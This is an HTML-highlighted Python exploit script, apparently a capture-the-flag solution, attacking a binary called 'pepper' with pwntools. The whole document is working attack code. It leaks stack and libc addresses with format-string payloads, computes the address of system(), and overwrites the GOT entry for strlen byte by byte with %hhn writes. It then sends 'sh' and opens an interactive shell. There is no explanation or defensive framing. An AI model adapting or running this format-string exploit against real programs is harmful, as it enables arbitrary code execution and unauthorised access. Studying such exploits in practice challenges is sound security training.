<div class="highlight"><pre><span class="c">#! /usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">re</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&#39;./pepper&#39;</span><span class="p">)</span>
<span class="n">lib</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&#39;/usr/lib/libc.so.6&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pepper&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice:&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;edit:&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;-2&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;XD:&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span> <span class="nb">str</span><span class="p">(</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;printf&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;n&#39;</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x3142</span>
<span class="k">print</span> <span class="s">&#39;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%</span><span class="s">14$hhn&#39;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span> <span class="n">payload</span> <span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;oice:&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">rdata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>
	<span class="n">rdata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;ch&#39;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;\[\[(.*)\]\]&#39;</span><span class="p">,</span><span class="n">rdata</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
		<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;\[\[(.*)\]\]&#39;</span><span class="p">,</span><span class="n">rdata</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">change</span><span class="p">(</span> <span class="n">payload</span> <span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;oice:&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">rdata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;choice&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="s">&#39;[[%6$p]]&#39;</span>
<span class="n">putchar_r</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="mi">11</span>
<span class="n">lib_base</span> <span class="o">=</span> <span class="n">putchar_r</span> <span class="o">-</span> <span class="n">lib</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;putchar&#39;</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">lib_base</span> <span class="o">+</span> <span class="n">lib</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;putchar: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">putchar_r</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;lib_base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">lib_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;system: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>


<span class="n">maddr</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="s">&#39;[[%25$p]]&#39;</span><span class="p">)</span>
<span class="n">faddr</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="s">&#39;[[%61$p]]&#39;</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">faddr</span><span class="o">-</span><span class="n">maddr</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">61</span>
<span class="n">mid</span> <span class="o">=</span> <span class="n">faddr</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span><span class="mi">2</span>
<span class="k">def</span> <span class="nf">write1b</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">b1</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">mid</span><span class="p">,</span> <span class="n">offset</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%</span><span class="s">25$hhn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">mid</span><span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">61$hhn&#39;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">25$hhn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">61$hhn&#39;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">25$hhn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">mid</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">61$hhn&#39;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">25$hhn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">mid</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%</span><span class="s">61$hhn&#39;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">))</span>
	<span class="n">change</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%%%d</span><span class="s">d</span><span class="si">%%%d</span><span class="s">$hhn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">offset</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">write4b</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>		<span class="c">#int</span>
	<span class="n">write1b</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="n">cont</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
	<span class="n">write1b</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">((</span><span class="n">cont</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
	<span class="n">write1b</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="p">((</span><span class="n">cont</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
	<span class="n">write1b</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="p">((</span><span class="n">cont</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>

<span class="n">addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">&#39;strlen&#39;</span><span class="p">]</span>
<span class="n">write4b</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;oice:&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;31337&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;sh&#39;</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>